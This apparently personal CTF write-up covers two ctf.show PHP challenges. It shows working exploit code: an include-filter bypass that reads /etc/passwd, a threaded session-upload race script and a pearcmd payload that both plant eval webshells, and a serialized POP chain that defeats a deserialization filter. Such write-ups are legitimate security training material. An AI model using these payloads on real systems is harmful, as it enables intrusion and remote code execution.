## easy_include
#文件包含 
```php
<?php  
  
function waf($path){    $path = str_replace(".","",$path);  
    return preg_match("/^[a-z]+/",$path);  
}  
  
if(waf($_POST[1])){  
    include "file://".$_POST[1];  
}
```

bypass
`1=localhost/etc/passwd`

![](attachments/Pasted%20image%2020240216140716.png)

session文件包含
```python
import requests
import io
import threading
 
 
url = "http://4c043e9c-de20-4f93-be21-45f5885768ce.challenge.ctf.show/"
session_id = "wumonster"
 
 
def write(session):
   filebytes = io.BytesIO(b'a' * 1024 * 50)
   while True:
       res = session.post(url,
           data={
               'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST[2]);?>"
              },
           cookies={
               'PHPSESSID': session_id
              },
           files={
               'file': ('hhh.jpg', filebytes)
              }
          )
 
 
def read(session):
   while True:
       res = session.post(url,
                          data={
                              "1":"localhost/tmp/sess_"+session_id,
                              "2":"file_put_contents('/var/www/html/shell.php' , '<?php eval($_POST[3]);?>');"
                              
                          },
                          cookies={
                              "PHPSESSID":session_id
                          }
                          )
       res2 = session.get("http://4c043e9c-de20-4f93-be21-45f5885768ce.challenge.ctf.show/shell.php")
       if res2.status_code == 200:
           print("getshell")
       else:
           print("Retry")
 
 
if __name__ == "__main__":
   evnet = threading.Event()
   with requests.session() as session:
       for i in range(5):
           threading.Thread(target=write, args=(session,)).start()
       for i in range(5):
           threading.Thread(target=read, args=(session,)).start()
   evnet.set()
```

pearcmd

`?+config-create+/<?=@eval($_POST['cmd']);die()?>+/tmp/shellcmd.php`
`1=localhost/usr/local/lib/php/pearcmd.php`


![](attachments/Pasted%20image%2020240216144441.png)


## easy_web
```php
开胃小菜，就让我成为签到题叭 `
<?php   
header('Content-Type:text/html;charset=utf-8');   
error_reporting(0);         
function waf1($Chu0){
	foreach ($Chu0 as $name => $value) {           
		if(preg_match('/[a-z]/i', $value)){               
			exit("waf1");           
		}       
	}   
}      
function waf2($Chu0){       
	if(preg_match('/show/i', $Chu0))           
	exit("waf2");   
}      
function waf_in_waf_php($a){    
	$count = substr_count($a,'base64');       
	echo "hinthinthint,base64喔"."<br>";       
	if($count!=1){           
		return True;       
	}       
	if (preg_match('/ucs-2|phar|data|input|zip|flag|\%/i',$a)){           
		return True;       
	}else{           
		return false;       
	}   
}      

class ctf{       
	public $h1;      
	public $h2;          
	public function __wakeup(){           
		throw new Exception("fastfast");       
	}          
	public function __destruct(){        
		$this->h1->nonono($this->h2);       
		}   
	}      
class show{          
	public function __call($name,$args){           
		if(preg_match('/ctf/i',$args[0][0][2])){              
			echo "gogogo";           
		}       
	}   
}      
class Chu0_write{       
	public $chu0;       
	public $chu1;       
	public $cmd;       
	public function __construct(){        
		$this->chu0 = 'xiuxiuxiu';       
	}
	public function __toString(){           
		echo "__toString"."<br>";           
		if ($this->chu0===$this->chu1){            
			$content='ctfshowshowshowwww'.$_GET['chu0'];               
			if (!waf_in_waf_php($_GET['name'])){                
				file_put_contents($_GET['name'].".txt",$content);               
			}else{                   
				echo "绕一下吧孩子";               
			}                
			$tmp = file_get_contents('ctfw.txt');                   
			echo $tmp."<br>";                   
			if (!preg_match("/f|l|a|g|x|\*|\?|\[|\]| |\'|\<|\>|\%/i",$_GET['cmd'])){                       
				eval($tmp($_GET['cmd']));                   
			}else{                       
				echo "waf!";                   
			}            
			file_put_contents("ctfw.txt","");           
		}           
		return "Go on";           
	}   
}
	         
if (!$_GET['show_show.show']){       
	echo "开胃小菜，就让我成为签到题叭";    
	highlight_file(__FILE__);   
}else{       
	echo "WAF,启动！";   
	waf1($_REQUEST);    
	waf2($_SERVER['QUERY_STRING']);       
	if (!preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])){        
		unserialize($_GET['show_show.show']);       
	}else{           
		echo "被waf啦";       
	}      
}
```

传参考点是`[` 
`?show[show.show=`

反序列化
`ctf:__destruct()->show:__call()->chu0_write:__toString()`

传入时利用`ArrayObject`的接口特性，反序列化为C类型的反序列化字符串
地址绕过判断

```php
$ctf = new ctf();
$show = new show();
$Chu0 = new Chu0_write();
$Chu0->chu1 = &$Chu0->chu0;
$ctf->h1 = $show;
$ctf->h2 = [['','',$Chu0]];

$arrayobject = new ArrayObject($show);
echo(serialize($arrayobject));


if (!preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])){
    unserialize($arrayobject);
}
```


